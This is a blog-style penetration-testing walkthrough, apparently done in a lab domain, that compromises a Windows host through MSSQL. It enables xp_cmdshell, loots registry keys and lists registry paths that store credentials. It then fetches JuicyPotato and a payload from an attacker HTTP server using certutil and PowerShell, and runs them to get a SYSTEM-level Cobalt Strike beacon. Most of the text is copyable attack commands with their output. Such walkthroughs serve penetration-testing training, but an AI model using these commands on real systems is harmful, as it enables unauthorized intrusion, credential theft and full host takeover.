---
title: "From SQL to SYSTEM: Registry Looting and Privilege Escalation via MSSQL"
date: 2025-07-02
categories: [MSSQL, Privilege Escalation, Registry Looting, JuicyPotato]
tags: [MSSQL, Privilege Escalation, JuicyPotato, SeImpersonatePrivilege]
---

## Attack Scenario Introduction
In Windows, every process runs under a security token that represents the user’s identity and privileges. These tokens can be abused if the process has the **SeImpersonatePrivilege**, a powerful right typically granted to administrators and service accounts. This privilege allows a process to impersonate another user’s token, often leveraged through APIs like **CreateProcessWithTokenW** to escalate privileges, commonly from a local admin to **SYSTEM**.

While legitimate software uses this for service management or single sign-on operations, attackers weaponise it using “Potato-style” exploits. These techniques involve tricking a SYSTEM-level process into leaking its token, which is then hijacked to execute commands as SYSTEM. This is particularly useful when exploiting services such as **IIS**, **Jenkins**, or **MSSQL**, where code execution is already possible under a service context.

In this walkthrough, we compromise a host through **MSSQL** using a low-privileged domain user with **SeImpersonatePrivilege** enabled. We enable and abuse **xp_cmdshell** to execute OS-level commands, loot the registry for stored secrets, download and execute payloads including **JuicyPotato** to escalate to SYSTEM, and explore alternative methods for downloading files when default techniques like **certutil** are blocked, such as using PowerShell.

## Limitations.
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. Use PrintSpoofer and RoguePotato for these versions.

## Verify Obtained Credentials Can Log In to MSSQL
We can use **Netexec** to quickly verify whether the obtained credentials are valid for logging into MSSQL on the target system.

Netexec MSSQL Login Command:
```bash
netexec mssql 192.168.1.178 -d essos.local -u 'khal.drogo' -p 'horse'
```
The image below shows **Netexec** successfully authenticating to the MSSQL service using the provided credentials. This confirms that the account is valid and accessible for further interaction.
![VerifyCredsWork](assets/images/mssql/7-verify-mssql-creds-work.png)

## Connecting to MSSQL with Windows Credentials 

We’ll use **Impacket’s mssqlclient.py** to authenticate to MSSQL using Windows credentials.

**Command:**
```bash
python3 /home/user/venv/bin/mssqlclient.py essos.local/khal.drogo:'horse'@192.168.1.178 -windows-auth
```

The image below shows a successful connection to MSSQL using **mssqlclient.py** with valid domain credentials.
![ConnectingToMSSQL](assets/images/mssql/6-connecting-to-mssql.png)

## Enable XPCMDSHELL from MSSQL

Before we can run OS commands via SQL Server, we need to enable the powerful but disabled-by-default **xp_cmdshell** feature. This is a two-step process:

### Step 1: Allow Access to Advanced Options

First, we need to make sure that advanced options are visible and configurable. Without this, we won’t be able to enable xp_cmdshell.
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```
The image below shows the command used to enable **show advanced options**, which is required before enabling advanced features like **xp_cmdshell** in SQL Server.
![Enablexp_cmdshell_ShowAdvancedOptions](assets/images/mssql/enable-xp_cmdshell-show-advanced-options.png)

### Step 2: Enable xp_cmdshell

Once advanced options are unlocked, we can enable the xp_cmdshell feature itself:
```sql
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
The image below shows the command used to enable **xp_cmdshell**, allowing us to execute operating system commands directly from within SQL Server.
![Enablexp_cmdshell](assets/images/mssql/enable-xp_cmdchell.png)

This two-step process is required because many advanced SQL Server features, including **xp_cmdshell** are hidden by default for security reasons. After running these commands, you’ll be able to execute Windows shell commands directly through SQL.

### Verifying xp_cmdshell Execution
To confirm that **xp_cmdshell** is properly enabled and functioning, we can run a simple command like **whoami**. This will return the Windows user context under which the SQL Server service is running.
```sql
EXEC xp_cmdshell 'whoami';
```
The image below demonstrates successful execution of an OS command using **xp_cmdshell**, confirming that the feature is enabled and functioning as expected.
![CheckCommandExec](assets/images/mssql/verify-xp_cmdshell-is-working.png)

## Enumerate and Read Registry Keys

Once we have command execution within MSSQL, we can use the extended stored procedures **xp_regenumkeys** and **xp_regread** to search and read registry keys. This is useful is there are credentials saved within the registry.

**Extended Stored Procedures** are special SQL Server routines (prefixed with **xp_**) that allow interaction with the underlying **Windows OS**, such as reading the registry, executing shell commands, managing files, or querying the system.

We can enumerate existing registry keys using the **xp_regenumkeys** extended stored procedure. The following command lists all subkeys under **HKEY_LOCAL_MACHINE\SOFTWARE**, helping us identify potentially interesting paths for further inspection (e.g., applications, credentials, configs).

**Enumerate registry keys command:**
```sql
EXEC xp_regenumkeys 'HKEY_LOCAL_MACHINE', 'SOFTWARE\';
```
![EnumRegKeys](assets/images/mssql/1-enumerate-registry-keys.png)

As shown in the output above, there’s an interesting subkey under HKLM\SOFTWARE called **TempTestCreds**, we’ll come back to that shortly.

When enumerating registry subkeys, you can follow the path by simply appending to it. For example:
`EXEC xp_regenumkeys 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft';`
This will show what subkeys exist under the **Microsoft** key. You can keep drilling down in this way until you find something useful, or not.

The image below shows the result of enumerating the registry key **HKLM\SOFTWARE\Microsoft**. This step helps identify what subkeys are present under the **Microsoft** key, allowing us to further explore for potential credentials, configuration files, or interesting software-specific entries.
![EnumRegKeys2](assets/images/mssql/2-enumerate-registry-keys.png)

Now back to that interesting **TempTestCreds** subkey we found. If we want to read the values of the **TempTestCreds** key there are two methods we can choose.

### Read Registry Key Values

#### Method 1 - Read Registry Key Values With xp_regread

We can use the stored procedure **xp_regread** to read the string value by appending the string name to the query. 

**Example Commands:**
```sql
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\TempTestCreds', 'Password';
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\TempTestCreds', 'Username';
```
**xp_regread** Output:
![ReadReg1](assets/images/mssql/3-xp_regread.png)

This is great, but there’s a problem.  
In order to read a key’s **value data**, we must already know the **name of the string** where that data resides.

But what if the string isn’t called **Password** or **Username**?  What if it has a completely random or obscure name like **AuthBlob32** or **Cred01**? Without knowing the exact value name, the **xp_regread** procedure becomes almost useless, unless we get creative. This is where method 2 comes in. 

#### Method 2 - Read Registry Key Values With xp_cmdshell reg query 

Instead of relying on SQL Server’s built-in registry procedures, we can use **xp_cmdshell** to run native Windows commands that dump all values under a registry key. This allows us to search for interesting strings like **password**, **token**, or **key** in the output, even if the value names are obscure or unpredictable.

So rather than using **xp_regread**, we’ll use **xp_cmdshell** with the **reg query** command and specify the registry path. This outputs all data associated with the specified key, without requiring us to guess the name of the value.

**Read registry key using xp_cmdshell:**
```sql
EXEC xp_cmdshell 'reg query "HKLM\SOFTWARE\TempTestCreds"';
```
The image below shows the result of using **xp_cmdshell** and **reg query** to dump all data from the **HKLM\SOFTWARE\TempTestCreds** registry key. 
![ReadReg2](assets/images/mssql/4-read-regkey-with-xp_cmdshell.png)

#### Method 3 - Run a Recursive Find to Locate Passwords

Another method of reading registry keys of interest is to once again use **xp_cmdshell** to run native Windows commands, this time piping the output through **findstr** to filter for keywords like **password**, **key**, or **credential**.

While effective, it’s important to note that this method can be **slow** and may even **kill your session** if the search is too broad or resource-intensive. However, if you **know the general location** of a registry key and you’re confident it contains credentials or other sensitive data but you **don’t know exactly where**, then using **findstr** might be the most efficient way to uncover what you're looking for.

Search for **pass** within a registry key recursively:
```sql
EXEC xp_cmdshell 'reg query "HKLM\SOFTWARE\TempTestCreds" /s | findstr /i pass';
```
**_Be cautious_** — running this on large registry trees may hang or crash the SQL session depending on permissions and system load.

The image below demonstrates the result of using **xp_cmdshell** with **findstr** to extract all registry entries under **HKLM\SOFTWARE\TempTestCreds** that contain the keyword **pass**.
![FindRegKeys](assets/images/mssql/5-recursive-find-read-registry.png)

### Registry Paths Accessible via xp_cmdshell for Credential Hunting

If you’re looking for credentials using **xp_cmdshell**, here are a few registry paths worth **investigating**. These locations are commonly used by Windows or third-party applications to store **usernames, passwords, or authentication tokens**.

**Registry Paths:**
* HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
* HKLM\SYSTEM\CurrentControlSet\Services\
* HKLM\SOFTWARE\RealVNC\WinVNC4
* HKLM\SOFTWARE\OpenVPN
* HKLM\SOFTWARE\Wow6432Node\*
* HKCU\Software\Microsoft\Terminal Server Client\Servers
* HKLM\SOFTWARE\<3rd Party App>

## Enumerate Privilege Escalation Attack Paths
### Enumerate SeImpersonatePrivilege 

We enumerate **SeImpersonatePrivilege** to check whether the current SQL Server process (or user context) has the ability to **impersonate** another user, such as **SYSTEM**. This privilege is required for many **privilege escalation techniques**, including **Juicy Potato** and **PrintSpoofer**.

If this privilege is present, it means we can potentially escalate from a low-privileged service account to **NT AUTHORITY\SYSTEM**, gaining full control of the machine.

**Enumerate SeImpersonatePrivilege Command:**
```sql
EXEC xp_cmdshell 'whoami /priv';
```
The image below shows the enumeration and successful discovery of an enabled **SeImpersonatePrivilege**, indicating that the current user context can potentially be used to escalate privileges to **SYSTEM** using techniques like **Juicy Potato** or **PrintSpoofer**.
![EnumSeImpersonatePrivilege](assets/images/mssql/enumerate-SeImpersonatePrivilege.png)

### Enumerate .NET Versions Installed on the Target Host

In some cases, **potato-based privilege escalation binaries** (like Juicy Potato or Rogue Potato) are compiled for specific **.NET Framework versions**. To ensure compatibility, we can query the registry to determine which .NET versions are installed on the target system.

**Command:**
```sql
EXEC xp_cmdshell 'reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s';
```
The image below shows the output of querying the registry for installed .NET Framework versions using **xp_cmdshell**. This helps us determine which binaries (e.g. Juicy Potato) will be compatible with the target system.

We can see that **.NET Framework 4.6.01586** is installed under:
**HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full**
This means we can confidently use tools compiled for **.NET 4.6 or lower**, ensuring compatibility during privilege escalation.
![EnumDotNet](assets/images/mssql/enumerate-dotnet-version-output.png)

### Enumerate System Information

To gather basic details about the target host such as the OS version, hostname, architecture, and patch level, we can use the built-in **systeminfo** command via **xp_cmdshell**. This information is valuable for tailoring exploits, understanding the environment, and planning privilege escalation techniques.

**Command:**
```sql
EXEC xp_cmdshell 'systeminfo';
```
The output below shows the output of **systeminfo**, revealing useful details such as the OS version (Windows Server 2016), build number, system architecture, and more — all directly from within the SQL Server session.

**Output:**
```sql
SQL (ESSOS\khal.drogo  dbo@master)> EXEC xp_cmdshell 'systeminfo';
output                                                                                                            
---------------------------------------------------------------------------------------------------------------   
NULL                                                                                
Host Name: BRAAVOS                                                                 
OS Name: Microsoft Windows Server 2016 Standard Evaluation                         
OS Version:10.0.14393 N/A Build 14393                                              
OS Manufacturer: Microsoft Corporation                                             
OS Configuration: Member Server                                                    
OS Build Type: Multiprocessor Free 

Registered Owner:                                                                  
Registered Organization: Vagrant                                                   
Product ID:00378-00000-00000-AA739                                                 
Original Install Date:2/20/2025, 1:42:58 PM 

System Boot Time:5/9/2025, 8:36:54 AM                                              
System Manufacturer: VMware, Inc.                                                  
System Model: VMware Virtual Platform                                              
System Type: x64-based PC                                                                           
Processor(s): 4 Processor(s) Installed.                                            
[01]: Intel64 Family 6 Model 62 Stepping 4 GenuineIntel ~2195 Mhz                  
[02]: Intel64 Family 6 Model 62 Stepping 4 GenuineIntel ~2195 Mhz                  
[03]: Intel64 Family 6 Model 62 Stepping 4 GenuineIntel ~2195 Mhz                  
[04]: Intel64 Family 6 Model 62 Stepping 4 GenuineIntel ~2195 Mhz                      
BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018                            
Windows Directory: C:\Windows                                                      
System Directory: C:\Windows\system32                                              
Boot Device: \Device\HarddiskVolume1                                               
System Locale: en-us;English (United States)                                       
Input Locale: en-us;English (United States)                                        
Time Zone: (UTC-08:00) Pacific Time (US & Canada)                                                 
Total Physical Memory: 5,999 MB                                                    
Available Physical Memory: 4,125 MB                                                
Virtual Memory: Max Size: 6,959 MB                                                 
Virtual Memory: Available: 5,004 MB                                                
Virtual Memory: In Use: 1,955 MB                                                                  
Page File Location(s): C:\pagefile.sys                                             
Domain: essos.local                                                                
Logon Server: N/A                                                                                    
Hotfix(s): 4 Hotfix(s) Installed.                                                  
[01]: KB3192137                                                                    
[02]: KB3211320                                                                    
[03]: KB4485447                                                                    
[04]: KB4487026                                                                    

Network Card(s): 2 NIC(s) Installed.                                               
[01]: Intel(R) PRO/1000 MT Network Connection                                      
Connection Name: Ethernet0                                                       
DHCP Enabled:    Yes                                                             
DHCP Server:     192.168.1.254                                                   

IP address(es)                                                                   
[01]: 192.168.1.178                                                              
[02]: fe80::599b:eaa9:2243:dfe5                                                  
[03]: fd78:4c15:7f9d:1:599b:eaa9:2243:dfe5                                       
[04]: fd78:4c15:7f9d:0:599b:eaa9:2243:dfe5                                       
[05]: 2a00:23c6:5ca1:1b01:599b:eaa9:2243:dfe5                                    
[06]: 2a00:23c6:5ca1:1b01::178                                                   
[07]: 2a00:23c6:5ca1:1b00:599b:eaa9:2243:dfe5                                    
[02]: Intel(R) PRO/1000 MT Network Connection                                          
Connection Name: Ethernet1                                                       
DHCP Enabled:    No                                                              
IP address(es)                                                                   
[01]: 192.168.56.23                                                              
[02]: fe80::8ceb:b7c:aca6:f909                                                   

Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed.   
NULL
```
## Privilege Escalation via JuicyPotato

### Download Juicypotato and malicious binary to target using xpcmdshell.

On our attacking machine, we need to have a copy of **JuicyPotato.exe** along with a second executable of our choosing, for example, **netcat**, a custom reverse shell, or a beacon implant. This second binary will be used by **Juicy Potato** to execute a payload that establishes a shell or initiates **C2 communication** back to our attacking host.

We’ll serve these binaries using **Python’s built-in HTTP server**, and then download them directly from the MSSQL target host using **xp_cmdshell**. This allows us to transfer and stage our tools without needing SMB shares or RDP access.

### Start a Python Web Server on the Attacker’s Host
To make our payloads available for download by the target, we’ll start a simple web server using Python on our attacking machine. This allows the target host to fetch binaries like **JuicyPotato.exe** and **nc.exe** over HTTP.

**Command:**
```bash
python3 -m http.server 80
```

This will serve files from the current directory over port **80**. Make sure your firewall allows inbound HTTP traffic and that the MSSQL target can reach your attacking machine.

The image below shows a Python web server being started on the attacker's machine, serving files over port **80**. This allows the target MSSQL host to download tools such as **JuicyPotato.exe** and our secondary foothold binary directly over HTTP.

![StartWebServer](assets/images/mssql/start-python-http-server.png)

### Method 1 – Download Malicious Files Using xp_cmdshell and certutil  

One commonly used technique for downloading files to a target host via MSSQL is to leverage **xp_cmdshell** to invoke **certutil**, a native Windows binary capable of fetching files over HTTP.

However, this method relies on the **CreateProcess** API to launch external processes. In some environments, this may be restricted,  especially when the SQL Server is running under a **low-privileged service account** that does **not have permission** to spawn new processes.

In this example, although the command syntax is valid, the attempt fails due to insufficient privileges. The output below shows the error returned:

 `Line 1: An error occurred during the execution of xp_cmdshell. A call to 'CreateProcess' failed with error code: '5'.`

This indicates that the account used to access the MSSQL database does not have the necessary rights to execute external commands.

That said, if the SQL Server process is running under a user or service account with sufficient privileges, the following commands will work as expected.

**Commands (if permissions allow):**
```sql
EXEC xp_cmdshell 'certutil -urlcache -split -f http://192.168.1.210/JuicyPotato.exe C:\Users\Public\JuicyPotato.exe';
EXEC xp_cmdshell 'certutil -urlcache -split -f http://192.168.1.210/nc.exe C:\Users\Public\nc.exe';
```
The image below illustrates the failure when attempting to use **certutil**, confirming the process creation restriction.

![AccessDeniedCreateProcess](assets/images/mssql/error-usingxp_cmdshell-and-certutil-to-donwload-files.png)

### Method 2 - Download Malicious Files Using xp_cmdshell and PowerShell

Since **Method 1** failed when attempting to use **certutil**, we need to find an alternative way to get our binaries onto the target host. Fortunately, we can try to spawn a **PowerShell** process using **xp_cmdshell** to download the files instead.

Before doing so, we first test whether PowerShell can be invoked successfully by the current user context. This helps us confirm whether **process creation is allowed at all**, or whether it's just **certutil** that is being restricted.

**Test PowerShell Execution Command:**
```sql
EXEC xp_cmdshell 'powershell -c "Write-Output CanWeUsePowerShell"';
```
If the output returns **CanWeUsePowerShell**, it means PowerShell is available and executable from within SQL Server, even if **certutil** is blocked.

The image below shows the output returned from our PowerShell test, confirming that **PowerShell is available and executable** from within SQL Server via **xp_cmdshell**. This means we can leverage it to download and execute files on the target host.

![TestPowerShellAccess](assets/images/mssql/testing-mssql-can-spawn-powershell.png)

The following commands can now be used to **download malicious binaries to the target host using PowerShell**. Since PowerShell is available and executable via **xp_cmdshell**, we can leverage it to retrieve our payloads directly from our attacker-controlled Python web server.

**Download Files via PowerShell:**
```sql
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://192.168.1.210/JuicyPotato.exe -OutFile C:\Users\Public\JuicyPotato.exe"';
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://192.168.1.210/foothold.exe -OutFile C:\Users\Public\foothold.exe"';
```
The image below shows the files being successfully downloaded from the Python web server hosted on the attacker machine. This confirms our ability to stage binaries on the target for further exploitation.

![FilesDownloadedFromWebServer](assets/images/mssql/files-downloaded-from-python-webserver.png)

### Confirm Successful Download by Listing C:\Users\Public\

To verify that the files have been successfully downloaded, we can list the contents of the **C:\Users\Public\** directory using **xp_cmdshell**.

List Directory Contents to Confirm Download
```sql
EXEC xp_cmdshell 'dir C:\Users\Public\';
```
The image below shows the contents of the directory, confirming that **JuicyPotato.exe** and **foothold.exe** have been successfully downloaded to the target host.

![FilesDownloaded](assets/images/mssql/download-juicypotato-and-foothold.png)

## Exploit SeImpersonatePrivilege with Juicypotato

In this demonstration, **foothold.exe** is a custom payload, in this case, a **Cobalt Strike beacon** used for callback. However, this could easily be replaced with another payload such as **netcat.exe**, a **Metasploit reverse shell**, or any other **C2 framework dropper**.

Once both **JuicyPotato.exe** and **foothold.exe** have been successfully staged on the target host, we can proceed with the final step: executing **JuicyPotato** to escalate privileges and run our payload as **SYSTEM**.

### 1. Start Your Listener (if needed)
**Command:**
```bash
nc -lnvp 8443
```
### 2. Execute JuicyPotato from MSSQL via xp_cmdshell 

The below command runs **JuicyPotato** using a known COM listening port (**-l 53375**), specifies **cmd.exe** as the payload process with **foothold.exe** as its argument, and sets the token impersonation type to * for automatic detection and exploitation of available privileges.

**Command:**
```sql
EXEC xp_cmdshell 'C:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\foothold.exe" -t *';
```
The image below shows **xp_cmdshell** being used to execute **JuicyPotato**, which in turn launches **foothold.exe** our payload used to establish a shell on the target system.

![JuicyPotatoExecuted](assets/images/mssql/executing-juicypotaot-attack.png)

Once executed, the payload (in this case, **foothold.exe**) runs with **SYSTEM-level privileges**, establishing a C2 callback or reverse shell as intended. The image below shows successful C2 communication being established after launching the attack from within **MSSQL** using **xp_cmdshell**

![ShellSessionEstablished](assets/images/mssql/High-prividged-C2-beacon.png)

And that’s it! We’ve successfully gained access to **MSSQL** using a low-level domain user, enumerated and looted the **Windows registry**, gathered valuable system information, and ultimately **escalated privileges to SYSTEM**. This demonstrates how a misconfigured SQL Server instance can serve as a powerful entry point for full host compromise when combined with post-exploitation techniques. I hope this walkthrough proves useful to someone looking to understand or replicate this attack path in a lab or an engagement. 







